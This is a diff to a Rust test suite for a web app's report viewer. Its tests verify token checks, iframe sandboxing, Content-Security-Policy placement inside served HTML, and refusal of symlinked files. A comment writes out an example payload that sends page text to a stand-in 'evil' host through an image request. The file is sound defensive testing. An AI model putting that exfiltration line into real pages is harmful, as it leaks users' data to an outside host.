@@ -640,6 +640,39 @@ async fn get_html(router: &axum::Router, path: &str) -> (StatusCode, String) {
     (status, String::from_utf8_lossy(&bytes).to_string())
 }
 
+/// Like [`get_html`] but keeps the headers, for the tests that have to compare
+/// what was sent *about* a document with what was sent *inside* it.
+async fn get_html_with_headers(
+    router: &axum::Router,
+    path: &str,
+) -> (StatusCode, axum::http::HeaderMap, String) {
+    let res = router
+        .clone()
+        .oneshot(
+            Request::builder()
+                .uri(path)
+                .header("host", "localhost:7777")
+                .header("authorization", format!("Bearer {TEST_TOKEN}"))
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    let status = res.status();
+    let headers = res.headers().clone();
+    let bytes = res.into_body().collect().await.unwrap().to_bytes();
+    (status, headers, String::from_utf8_lossy(&bytes).to_string())
+}
+
+/// The `content="…"` of the first `<meta http-equiv="Content-Security-Policy">`
+/// in a document, i.e. the policy a parser would actually apply.
+fn meta_csp(body: &str) -> Option<&str> {
+    const TAG: &str = r#"<meta http-equiv="Content-Security-Policy" content=""#;
+    let start = body.find(TAG)? + TAG.len();
+    let end = start + body[start..].find('"')?;
+    Some(&body[start..end])
+}
+
 #[tokio::test]
 async fn reports_are_listed_and_served() {
     let (dir, _router, db) = setup(false).await;
@@ -666,9 +699,348 @@ async fn reports_are_listed_and_served() {
     assert_eq!(status, StatusCode::OK);
     assert!(body.contains("equity"));
 
-    let (status, index) = get_html(&router, "/reports").await;
+    // The listing page is a shell: it embeds no report content, fetches the
+    // names from the guarded API, and shows a report inside a frame that has
+    // no `allow-same-origin`, so an injected script in a report cannot reach
+    // this origin's sessionStorage (where the access token lives).
+    let (status, shell) = get_html(&router, "/reports").await;
     assert_eq!(status, StatusCode::OK);
-    assert!(index.contains("/report/factor.html"));
+    assert!(
+        !shell.contains("factor.html"),
+        "the shell must not server-render the listing"
+    );
+    assert!(shell.contains("/api/reports"), "listing comes from the API");
+    assert!(shell.contains(r#"sandbox="allow-scripts""#), "{shell}");
+    assert!(
+        !shell.contains("allow-same-origin"),
+        "sandboxing a report and then handing back the origin is no sandbox"
+    );
+    assert!(
+        shell.contains("srcdoc"),
+        "report HTML is never a document here"
+    );
+}
+
+/// A report is the output of somebody's strategy and its content is shaped by
+/// vendor market names, strategy names and config JSON. It must not be
+/// readable by any other process on the box, and the copy that is served must
+/// not be able to script the origin that holds the access token.
+#[tokio::test]
+async fn the_report_route_requires_the_token_and_ships_a_sandboxing_csp() {
+    let (dir, _router, db) = setup(false).await;
+    let router = router_with_reports(&db, dir.path(), &[("tearsheet.html", "<p>equity</p>")]);
+
+    let fetch_report = |token: Option<&str>| {
+        let mut req = Request::builder()
+            .uri("/report/tearsheet.html")
+            .header("host", "127.0.0.1:8000");
+        if let Some(token) = token {
+            req = req.header("authorization", format!("Bearer {token}"));
+        }
+        router.clone().oneshot(req.body(Body::empty()).unwrap())
+    };
+
+    for token in [None, Some("wrong")] {
+        let res = fetch_report(token).await.unwrap();
+        assert_eq!(res.status(), StatusCode::UNAUTHORIZED, "token {token:?}");
+        let bytes = res.into_body().collect().await.unwrap().to_bytes();
+        let body = String::from_utf8_lossy(&bytes).to_string();
+        assert!(!body.contains("equity"), "report leaked without a token");
+        assert!(body.contains("unauthorized"), "{body}");
+    }
+
+    let res = fetch_report(Some(TEST_TOKEN)).await.unwrap();
+    assert_eq!(res.status(), StatusCode::OK);
+    // The header is the *navigation* copy of the policy and proves only that a
+    // direct open of this URL is contained. It says nothing about the path the
+    // shell takes; that is `the_report_policy_travels_inside_the_served_document`
+    // below, and asserting this header alone was how a control that never ran
+    // came to look tested.
+    let csp = res
+        .headers()
+        .get("content-security-policy")
+        .expect("reports carry a CSP")
+        .to_str()
+        .unwrap()
+        .to_string();
+    assert!(csp.contains("sandbox allow-scripts"), "{csp}");
+    assert!(
+        !csp.contains("allow-same-origin"),
+        "an opaque origin is the whole point: {csp}"
+    );
+    assert!(csp.contains("default-src 'none'"), "{csp}");
+
+    // The shell itself stays reachable without a token: a browser cannot put
+    // an Authorization header on a top-level navigation, and the shell carries
+    // no data of its own.
+    let res = router
+        .clone()
+        .oneshot(
+            Request::builder()
+                .uri("/reports")
+                .header("host", "127.0.0.1:8000")
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(res.status(), StatusCode::OK);
+}
+
+/// A CSP header on the report response is not the control that runs.
+///
+/// The shell pulls a report with `fetch` and assigns the text to
+/// `frame.srcdoc`; a `srcdoc` document takes its policy from its *embedder*,
+/// never from the response the text came out of, and the embedder (`/reports`)
+/// sends none. So the policy has to be in the bytes, in the head, ahead of the
+/// report's own markup, because a meta policy governs only what the parser
+/// reads after it. This test asserts the enforceable placement, not the mere
+/// existence of a string somewhere in the file.
+#[tokio::test]
+async fn the_report_policy_travels_inside_the_served_document() {
+    let (dir, _router, db) = setup(false).await;
+    let router = router_with_reports(
+        &db,
+        dir.path(),
+        &[(
+            "tearsheet.html",
+            "<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n\
+             <title>t</title>\n<style>b{color:red}</style>\n</head>\n\
+             <body><p>equity</p><script>draw()</script></body></html>",
+        )],
+    );
+    let (status, body) = get_html(&router, "/report/tearsheet.html").await;
+    assert_eq!(status, StatusCode::OK);
+    let policy = meta_csp(&body).expect("the served document carries its own policy");
+
+    // Exfiltration is a *send*, and an opaque-origin sandbox only blocks
+    // *reads*. Without these an injected market name runs
+    // `new Image().src = "https://evil/?" + document.body.innerText` from
+    // inside the sandbox and nothing stops it.
+    assert!(policy.contains("default-src 'none'"), "{policy}");
+    assert!(policy.contains("connect-src 'none'"), "{policy}");
+    assert!(policy.contains("img-src data: blob:"), "{policy}");
+    assert!(policy.contains("form-action 'none'"), "{policy}");
+    assert!(policy.contains("base-uri 'none'"), "{policy}");
+    // Reports draw their own charts from inline script and inline style, so
+    // both stay; `eval` does not, and no report needs it.
+    assert!(policy.contains("script-src 'unsafe-inline'"), "{policy}");
+    assert!(policy.contains("style-src 'unsafe-inline'"), "{policy}");
+    assert!(!policy.contains("unsafe-eval"), "{policy}");
+    // Browsers drop `sandbox` from a meta policy. Writing it here would read
+    // like a control and be none, which is the bug this test exists for; the
+    // opaque origin comes from the frame's `sandbox="allow-scripts"` attribute.
+    assert!(!policy.contains("sandbox"), "{policy}");
+
+    // Placement: inside the head, and ahead of every other thing in it.
+    let meta = body.find("http-equiv").unwrap();
+    let head = body.find("<head").unwrap();
+    assert!(
+        head < meta,
+        "a meta policy outside the head is ignored: {body}"
+    );
+    for later in ["charset", "<title>", "<style>", "<script>", "<p>equity"] {
+        assert!(
+            meta < body.find(later).unwrap(),
+            "{later} must be parsed under the policy, not before it: {body}"
+        );
+    }
+    // Never above the doctype: that is quirks mode, and it would reflow every
+    // report that renders correctly today.
+    assert!(body.starts_with("<!doctype html>"), "{body}");
+    // Nothing else about the report changed.
+    assert!(body.contains("<p>equity</p>"), "{body}");
+    assert!(body.contains("<script>draw()</script>"), "{body}");
+}
+
+/// `basket.py` writes `<!doctype html><meta charset=…><title>…` with no
+/// explicit `<head>`, so the head-less path is a real shape, not a hypothetical.
+/// The policy still has to lead, so the parser hoists it into the head it
+/// implies, and it still must not displace the doctype.
+#[tokio::test]
+async fn a_head_less_report_still_gets_the_policy_first() {
+    let (dir, _router, db) = setup(false).await;
+    let router = router_with_reports(
+        &db,
+        dir.path(),
+        &[
+            (
+                "basket.html",
+                "<!doctype html><meta charset='utf-8'><title>b</title><h1>b</h1>",
+            ),
+            ("fragment.html", "<p>equity</p>"),
+        ],
+    );
+
+    let (_status, body) = get_html(&router, "/report/basket.html").await;
+    assert!(
+        body.starts_with(r#"<!doctype html><meta http-equiv="Content-Security-Policy""#),
+        "{body}"
+    );
+    assert!(
+        meta_csp(&body).unwrap().contains("connect-src 'none'"),
+        "{body}"
+    );
+    // A charset declaration is only honoured inside the first 1 KiB, so the tag
+    // pushed in front of it may not be long enough to shove it out.
+    assert!(body.find("charset='utf-8'").unwrap() < 1024, "{body}");
+
+    // No doctype to step over: the policy simply leads.
+    let (_status, body) = get_html(&router, "/report/fragment.html").await;
+    assert!(
+        body.starts_with(r#"<meta http-equiv="Content-Security-Policy""#),
+        "{body}"
+    );
+    assert!(body.ends_with("<p>equity</p>"), "{body}");
+}
+
+/// Both ways a substring search for `<head` fails open.
+///
+/// `<head` is a prefix of `<header>`, so a body-level `<header>` in a head-less
+/// report would put the policy below the content it exists to constrain; and a
+/// `>` inside a quoted attribute would split the start tag, leaving the meta
+/// element parsed as attributes of `head` and the policy silently absent. Both
+/// end in a report that looks protected and is not, which is the whole shape of
+/// the bug being fixed, so neither may be reintroduced by the fix.
+#[tokio::test]
+async fn the_policy_placement_is_not_fooled_by_header_or_quoted_attributes() {
+    let (dir, _router, db) = setup(false).await;
+    let router = router_with_reports(
+        &db,
+        dir.path(),
+        &[
+            (
+                "decoy.html",
+                "<!doctype html><body><header>totals</header><p>equity</p></body>",
+            ),
+            (
+                "attrs.html",
+                "<!doctype html><html><head data-x=\"a>b\">\
+                 <title>t</title></head><body>x</body></html>",
+            ),
+        ],
+    );
+
+    // No head element at all: `<header>` must not be mistaken for one, so the
+    // policy leads the document instead.
+    let (_status, body) = get_html(&router, "/report/decoy.html").await;
+    let meta = body.find("http-equiv").unwrap();
+    assert!(
+        meta < body.find("<header>").unwrap(),
+        "the policy landed below the content it governs: {body}"
+    );
+    assert!(body.starts_with("<!doctype html><meta "), "{body}");
+
+    // A `>` inside an attribute value does not close the tag.
+    let (_status, body) = get_html(&router, "/report/attrs.html").await;
+    assert!(
+        body.starts_with("<!doctype html><html><head data-x=\"a>b\"><meta "),
+        "the meta was swallowed as head attributes: {body}"
+    );
+    assert!(
+        meta_csp(&body).unwrap().contains("connect-src 'none'"),
+        "{body}"
+    );
+}
+
+/// The header copy and the in-document copy are two spellings of one policy.
+///
+/// They are separate constants only because a `<meta>` policy may not carry
+/// `sandbox`. Any other directive present in one and missing from the other is
+/// a directive that does not run on the path that matters, which is exactly the
+/// failure this pair exists to close.
+#[tokio::test]
+async fn report_policies_stay_in_step() {
+    let (dir, _router, db) = setup(false).await;
+    let router = router_with_reports(
+        &db,
+        dir.path(),
+        &[("t.html", "<html><head></head><body>x</body></html>")],
+    );
+    let (status, headers, body) = get_html_with_headers(&router, "/report/t.html").await;
+    assert_eq!(status, StatusCode::OK);
+    let header = headers
+        .get("content-security-policy")
+        .unwrap()
+        .to_str()
+        .unwrap()
+        .to_string();
+    let meta = meta_csp(&body).expect("served document carries a policy");
+
+    // Compare directive sets, so whitespace and ordering differences between
+    // the two spellings do not read as drift.
+    let directives = |policy: &str| -> Vec<String> {
+        policy
+            .split(';')
+            .map(|d| d.split_whitespace().collect::<Vec<_>>().join(" "))
+            .filter(|d| !d.is_empty())
+            .collect()
+    };
+    let navigable: Vec<String> = directives(&header)
+        .into_iter()
+        .filter(|d| !d.starts_with("sandbox"))
+        .collect();
+    assert_eq!(navigable, directives(meta), "header {header}\nmeta {meta}");
+    // The one allowed difference, and `allow-scripts` has to survive in it:
+    // the frame attribute sandboxes too, and a document under two sandboxes
+    // gets only what both allow, so losing it here kills every chart.
+    assert!(header.contains("sandbox allow-scripts"), "{header}");
+}
+
+/// The reports feature has to be reachable from the main shell, in a form that
+/// carries the token. `sessionStorage` is per tab, so a link without one leaves
+/// a new tab with nothing to read, and the startup banner's `/` URL does not
+/// fix that tab either.
+#[tokio::test]
+async fn the_main_shell_links_to_reports_with_the_token() {
+    let (_dir, router, _db) = setup(false).await;
+    let (status, shell) = get_html(&router, "/").await;
+    assert_eq!(status, StatusCode::OK);
+    assert!(
+        shell.contains(r#"id="reportslink""#),
+        "no way in from the UI"
+    );
+    assert!(
+        shell.contains(r#""/reports?token=" + encodeURIComponent(TOKEN)"#),
+        "the link has to hand the token over: sessionStorage is per tab"
+    );
+}
+
+/// `read_to_string` follows symlinks, so a name-only allowlist plus a link
+/// planted in the reports directory read as "any file this process can open".
+#[cfg(unix)]
+#[tokio::test]
+async fn a_symlinked_report_is_refused_and_never_listed() {
+    let (dir, _router, db) = setup(false).await;
+    std::fs::write(dir.path().join("secret.html"), "<p>secret</p>").unwrap();
+    let router = router_with_reports(&db, dir.path(), &[("ok.html", "<p>ok</p>")]);
+    let reports = dir.path().join("reports");
+    // Both names pass `safe_report_name`; only refusing to follow the link
+    // keeps them from being served.
+    std::os::unix::fs::symlink(dir.path().join("secret.html"), reports.join("link.html")).unwrap();
+    std::os::unix::fs::symlink(dir.path(), reports.join("up.html")).unwrap();
+
+    for name in ["link.html", "up.html"] {
+        let (status, body) = get_html(&router, &format!("/report/{name}")).await;
+        assert_eq!(status, StatusCode::NOT_FOUND, "{name} was served: {body}");
+        assert!(!body.contains("secret"), "{name} followed the link: {body}");
+    }
+
+    // The listing has to agree with what the route will actually serve, or it
+    // advertises reports that 404.
+    let (_status, json) = get_json(&router, "/api/reports").await;
+    let names: Vec<&str> = json["reports"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|value| value.as_str().unwrap())
+        .collect();
+    assert_eq!(names, vec!["ok.html"]);
+
+    // The real file is still served.
+    let (status, body) = get_html(&router, "/report/ok.html").await;
+    assert_eq!(status, StatusCode::OK);
+    assert!(body.contains("ok"));
 }
 
 #[tokio::test]
